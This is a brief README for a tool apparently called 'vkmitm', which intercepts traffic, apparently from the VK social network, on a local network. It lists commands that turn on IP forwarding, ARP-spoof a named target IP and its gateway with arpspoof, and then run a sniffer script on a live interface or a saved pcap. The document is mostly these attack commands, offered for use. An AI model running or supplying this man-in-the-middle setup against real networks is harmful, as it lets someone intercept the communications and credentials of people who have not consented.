# Using

Tested on MacOs X, with dsniff from macports.

Start arp spoofing:

Target - 192.168.2.151
Gate - 192.168.2.1

```
$ sudo sysctl -w net.inet.ip.forwarding=1
$ sudo arpspoof -i en1 -t 192.168.2.151 192.168.2.1
$ sudo arpspoof -i en1 -t 192.168.2.1 192.168.2.151
```

Sniffing data on en1:

```
$ sudo ./sniff_vk.py -i en1
```

Parsing pcap file:
```
$ sudo ./sniff_vk.py -p test.pcap
```

# vkmitm
